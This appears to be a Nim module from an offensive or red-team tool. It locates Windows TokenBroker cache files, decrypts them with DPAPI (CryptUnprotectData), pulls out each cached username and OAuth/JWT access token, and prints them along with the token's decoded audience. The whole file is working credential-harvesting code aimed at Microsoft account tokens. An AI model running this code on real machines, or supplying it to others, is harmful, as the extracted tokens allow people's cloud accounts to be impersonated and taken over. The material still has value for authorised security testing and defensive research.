import os
import std/[base64, json, sequtils, streams, strutils, tables]

import constants
import utils

proc readTBRESStr(stream: Stream): string =
  discard stream.readInt32() # Skip 0xC type
  var length = swapInt32Endian(stream.readInt32())
  return stream.readStr(length)

proc findTBRES*() : void =
  var cache_path = getHomeDir() / "Appdata/Local/Microsoft/TokenBroker/Cache"

  # If doesn't exist, return
  if not dirExists(cache_path):
    echo "TokenBroker cache not found"
    return

  # Get all files in cache and decrypt them using CryptUnprotectData
  var files = toSeq(walkFiles(cache_path & "\\*.tbres"))
  for file in files:
    var tbres = try: readFile(file)
                except: echo "WOW"; continue # Skip if can't read file

    var cleaned_json = multiReplace(tbres, ("\x00", ""))
    var json = parseJson(cleaned_json)
    var response = json["TBDataStoreObject"]["ObjectData"]["SystemDefinedProperties"]["ResponseBytes"]["Value"].getStr()

    # Base64 decode response
    var decoded_response = decode(response)
    var decrypted = cryptUnprotectData(decoded_response)

    # Find the string "WTRes_Token"
    var username_index = decrypted.find("WA_UserName")
    var token_key_index = decrypted.find("WTRes_Token")
    if token_key_index >= 0:
      var decrypted_stream = newStringStream(decrypted[username_index..^1])
      discard decrypted_stream.readStr(0xB) # Skip WA_UserName length

      # Parse username
      var username = readTBRESStr(decrypted_stream)
      discard readTBRESStr(decrypted_stream) # Skip next header
      var token = readTBRESStr(decrypted_stream)
      
      # Base64 decode second split of token on "." and parse as JSON
      var token_json = parseJson(decode(token.split(".")[1]))
      var audience = token_json["aud"].getStr()

      echo ("Found: " & file).green.bold
      echo "\tUsername: " & username
      echo "\tAudience: " & WELL_KNOWN_APPIDS.getOrDefault(audience, audience)
      echo "\tToken: " & token & "\n"